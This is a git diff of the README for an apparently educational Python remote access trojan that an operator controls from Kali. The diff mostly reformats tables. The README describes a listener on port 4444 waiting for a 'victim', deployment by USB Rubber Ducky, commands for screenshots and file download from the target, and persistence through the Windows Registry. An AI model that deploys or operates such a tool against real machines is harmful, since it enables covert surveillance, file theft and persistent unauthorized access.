@@ -73,7 +73,7 @@ Step 1: Start Control Panel (Kali)
 python3 kali_control.py
 ```
 Output:
-
+```
 text
 ==================================================
   🎯 RAT Control Panel Active
@@ -82,6 +82,7 @@ text
 
 [*] 🚀 Listening on 0.0.0.0:4444
 [*] ⏳ Waiting for victim connection...
+```
 Step 2: Deploy to Windows
 Option A: USB Rubber Ducky
 ```
@@ -115,18 +116,19 @@ Command> download C:\secret.txt
 Command> exit
 👋 Disconnected
 ```
-📋 Commands
-```
-Command              Description          Example
-whoami	              Current user	      whoami
-ipconfig	            Network info       ipconfig
-systeminfo	          System details	   systeminfo
-dir / ls	            List directory	      dir
-cd <path>	            Change directory	 cd C:\Users
-ss	                  Take screenshot	     ss
-download <file>	      Download file	      download C:\flag.txt
-exit / quit	           Disconnect	          exit
-```
+## 📋 Commands
+
+| Command | Description | Example |
+|:--------|:------------|:--------|
+| 🖥️ `whoami` | Current user | `whoami` |
+| 🌐 `ipconfig` | Network info | `ipconfig` |
+| 💻 `systeminfo` | System details | `systeminfo` |
+| 📁 `dir` / `ls` | List directory | `dir` |
+| 📂 `cd <path>` | Change directory | `cd C:\Users` |
+| 📸 `ss` | Take screenshot | `ss` |
+| ⬇️ `download <file>` | Download file | `download C:\flag.txt` |
+| 🚪 `exit` / `quit` | Disconnect | `exit` |
+
 🛡️ Persistence
 The RAT adds itself to Windows Registry:
 ```
@@ -159,12 +161,16 @@ Markers:
 
 \x03 - File download
 
-❓ Troubleshooting
-Issue	                                                  Solution
-No connection	                                          Check firewall: sudo ufw allow 4444
-Wrong IP	                                              Verify KALI_IP matches your Kali IP
-Screenshots not saving	                                Check write permissions
-Module not found	                                      pip install pyautogui pillow
+## ❓ Troubleshooting
+
+| Issue | Solution |
+|:------|:---------|
+| ❌ No connection | ✅ Check firewall: `sudo ufw allow 4444` |
+| ❌ Wrong IP | ✅ Verify `KALI_IP` matches your Kali IP |
+| ❌ Screenshots not saving | ✅ Check write permissions |
+| ❌ Module not found | ✅ Install: `pip install pyautogui pillow` |
+| ❌ Connection drops | ✅ Auto-reconnect enabled |
+| ❌ Python not found | ✅ Install Python 3.x on target |
 
 🛠️ Customization
 Change screenshot quality:
@@ -195,11 +201,30 @@ SCREENSHOT_INTERVAL = 30  # Default: 15 seconds
 📝 License
 This project is for educational purposes only.
 
-✅ Do	                                  ❌ Don't
-Learn security	                        Use maliciously
-Test on own systems	                    Attack others
-Participate in CTFs	                     Violate laws
+| ✅ Allowed | ❌ Not Allowed |
+|:-----------|:---------------|
+| ✅ Educational purposes | ❌ Malicious use |
+| ✅ Authorized testing | ❌ Unauthorized access |
+| ✅ Own systems only | ❌ Attacking others |
+| ✅ CTF competitions | ❌ Violating laws |
+| ✅ Security research | ❌ Causing harm |
 
-                                                      Made with ❤️ for Security Education
-                                                      
-                                                      ⭐ Star this repo if you find it useful!
+---
+
+<div align="center">
+
+### 🛡️ Stay Safe, Stay Ethical
+
+**Made with ❤️ for Security Education**
+
+---
+
+⭐ **Star this repo** if you find it useful!  
+🐛 **Report issues** to help improve the project  
+🤝 **Contribute** to make it better for everyone
+
+---
+
+**"Remember: With great power comes great responsibility."**
+
+</div>
